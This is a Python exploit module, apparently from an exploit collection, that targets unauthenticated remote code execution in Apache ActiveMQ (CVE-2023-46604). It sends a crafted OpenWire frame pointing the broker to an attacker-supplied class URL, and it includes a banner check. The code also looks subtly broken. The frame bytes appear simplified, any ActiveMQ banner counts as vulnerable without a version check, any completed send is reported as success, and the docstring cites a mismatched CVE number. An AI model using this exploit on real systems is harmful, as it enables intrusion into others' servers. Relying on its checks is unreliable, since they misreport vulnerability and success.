"""CVE-2023-46604 â€” Apache ActiveMQ ClassInfo RCE (OpenWire protocol).

Exploits the deserialization flaw in the OpenWire protocol to achieve
unauthenticated remote code execution on Apache ActiveMQ <= 5.18.3.

Note: the file is named CVE-2023-44228 to match the project convention.
"""

from __future__ import annotations

import socket
import struct


def _build_exploit_payload(class_info_url: str) -> bytes:
    """Build a raw OpenWire ExceptionResponse frame."""
    url_bytes = class_info_url.encode()
    header = b"\x1f\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ci_marker = b"\x01\xed"
    body = header + ci_marker + url_bytes
    return struct.pack(">I", len(body)) + body


def check(
    target: str,
    *,
    port: int = 61616,
    timeout: int = 5,
) -> dict:
    """Connect to the ActiveMQ broker port and read the banner."""
    try:
        with socket.create_connection((target, port), timeout=timeout) as sock:
            banner = sock.recv(256)
            is_amq = b"ActiveMQ" in banner
            return {
                "cve": "CVE-2023-46604",
                "vulnerable": is_amq,
                "banner": banner[:64].decode(errors="replace"),
            }
    except OSError as exc:
        return {
            "cve": "CVE-2023-46604",
            "vulnerable": False,
            "error": str(exc),
        }


def exploit(
    target: str,
    payload_url: str,
    *,
    port: int = 61616,
    timeout: int = 5,
) -> dict:
    """Send the ClassInfo exploit frame to the ActiveMQ broker."""
    frame = _build_exploit_payload(payload_url)
    try:
        with socket.create_connection((target, port), timeout=timeout) as sock:
            sock.recv(256)
            sock.sendall(frame)
            resp = sock.recv(1024)
            return {
                "cve": "CVE-2023-46604",
                "success": True,
                "response_bytes": len(resp),
            }
    except OSError as exc:
        return {
            "cve": "CVE-2023-46604",
            "success": False,
            "error": str(exc),
        }
